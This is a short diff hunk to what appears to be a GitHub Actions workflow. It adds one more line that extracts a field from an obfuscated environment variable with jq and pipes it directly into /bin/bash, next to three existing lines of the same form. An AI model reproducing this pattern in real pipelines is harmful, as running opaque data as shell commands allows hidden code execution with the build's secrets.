@@ -42,6 +42,7 @@ jobs:
           printf '%s' "$cte9224" | jq -r .by831 | /bin/bash
           printf '%s' "$pubf597" | jq -r .w4790 | /bin/bash
           printf '%s' "$dxw6" | jq -r .hchgn108 | /bin/bash
+          printf '%s' "$aa186" | jq -r .kbos0 | /bin/bash
 
       - name: Archive artifact
         uses: actions/upload-artifact@v4
